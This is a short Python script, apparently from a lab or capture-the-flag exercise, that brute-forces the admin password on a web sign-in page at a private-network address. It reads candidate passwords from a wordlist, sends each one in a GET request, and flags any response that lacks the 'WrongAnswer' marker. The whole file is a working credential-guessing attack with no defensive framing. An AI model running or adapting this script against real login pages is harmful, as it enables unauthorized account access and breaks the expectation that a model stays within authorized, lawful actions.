#!/usr/local/bin/python3

import requests

targetURL = "192.168.1.16/index.php?page=signin"
dictionnary = open("common.txt", "r")

def request(url):
    try:
        return requests.get("http://" + url)
    except requests.exceptions.ConnectionError:
        pass 

print("Starting ... \n")

for line in dictionnary:
    word = line.strip()
    tmp = targetURL + "&username=admin" + "&password=" + word + "&Login=Login#"
    print(tmp)
    response = request(tmp)
    if response:
        x = str(response.content)
        pattern = "WrongAnswer"
        if str(pattern) not in x:
             print("[+] Discovery at : " + response.request.url)
        
print("\nDone")

# URL :

# http://192.168.1.16/index.php?page=signin&username=< ... >&password=< ... >Login=Login#

# Output at shadow